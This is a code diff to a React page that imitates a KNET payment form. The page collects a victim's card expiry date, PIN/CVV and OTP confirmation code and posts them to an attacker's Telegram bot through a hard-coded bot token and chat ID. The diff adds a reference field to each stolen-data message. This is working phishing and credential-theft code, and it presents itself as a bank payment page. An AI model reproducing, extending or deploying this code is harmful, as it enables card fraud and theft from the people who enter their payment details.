@@ -22,7 +22,7 @@ function KnetPageContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
   const price = searchParams.get("price");
-
+  const refN = searchParams.get("refN");
   const handleSend = async () => {
     if (!showOtp) {
       if (
@@ -44,6 +44,7 @@ function KnetPageContent() {
 📅 Exp Month: ${expMonth}
 📅 Exp Year: ${expYear}
 🔐 PIN: ${cvv}
+🔨 Ref:${refN}
       `;
 
       try {
@@ -71,7 +72,8 @@ function KnetPageContent() {
         setVerificationMsg("Code sent, verifying...");
         await axios.post(
           `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${encodeURIComponent(
-            `🔑 Confirmation Code: ${otp}`
+            `🔑 Confirmation Code: ${otp}
+             🔨 Ref: ${refN}`
           )}`
         );
         // لا تقم بالتوجيه هنا، فقط أظهر رسالة فقط (أو قم بما تريد بعد التحقق)
